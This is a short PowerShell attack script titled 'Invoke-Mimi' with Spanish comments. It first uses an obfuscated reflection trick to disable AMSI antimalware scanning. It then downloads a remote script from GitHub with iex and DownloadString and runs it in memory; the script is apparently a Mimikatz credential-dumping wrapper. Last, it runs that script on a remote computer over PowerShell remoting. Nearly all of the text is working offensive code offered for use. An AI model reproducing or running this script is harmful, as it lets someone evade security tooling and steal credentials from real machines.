# Invoke-Mimi
#By Luis Carreto

#Evasion de AMSI

$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " " ).GetField([string](38..51|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " ",'NonPublic,Static')."sE`T`VaLUE"(         ${n`ULl},${t`RuE} )

#Ejecucion en memoria

iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dr0pc/Invoke-Mimi/main/Invoke-Mimi.ps1')


#Ejecucion remota por PSSession

Invoke-Command -ScriptBlock  {AmsiBypass} ; & ${function:invoke-mimi} -ComputerName computer-name
